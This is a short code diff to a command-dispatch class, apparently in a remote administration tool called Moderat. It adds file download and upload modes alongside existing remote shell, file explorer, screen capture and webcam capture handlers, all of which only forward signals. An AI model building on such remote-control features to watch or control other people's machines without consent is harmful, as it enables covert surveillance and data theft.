@@ -32,6 +32,8 @@ class Modes:
             'shellMode': self.shellMode,
             'explorerMode': self.explorerMode,
             'scriptingMode': self.scriptingMode,
+            'downloadMode': self.downloadMode,
+            'uploadMode': self.uploadMode,
             'getScreen': self.getScreen,
             'getWebcam': self.getWebcam,
             # Moderators Modes
@@ -142,4 +144,10 @@ class Modes:
         self.moderat.send_signal(data)
 
     def downloadLog(self, data):
+        self.moderat.send_signal(data)
+
+    def downloadMode(self, data):
+        self.moderat.send_signal(data)
+
+    def uploadMode(self, data):
         self.moderat.send_signal(data)
